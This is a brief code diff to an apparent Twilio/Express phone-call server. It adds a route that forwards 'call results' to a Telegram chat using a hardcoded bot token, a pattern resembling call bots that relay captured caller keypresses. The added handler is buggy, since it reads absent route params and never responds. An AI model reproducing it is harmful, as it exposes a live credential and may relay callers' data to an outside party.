@@ -41,8 +41,11 @@ app.post('/handle-key', (req, res) => {
   res.send(twiml.toString());
 });
 
+app.post('/callOutputs', (req, res) => {
+    axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendMessage?chat_id=5113588348&text=Call result: ' + req.params) 
+});
+
 app.listen(port, () => {
   console.log(`Server is running at http://localhost:${port}`);
 });
-
 
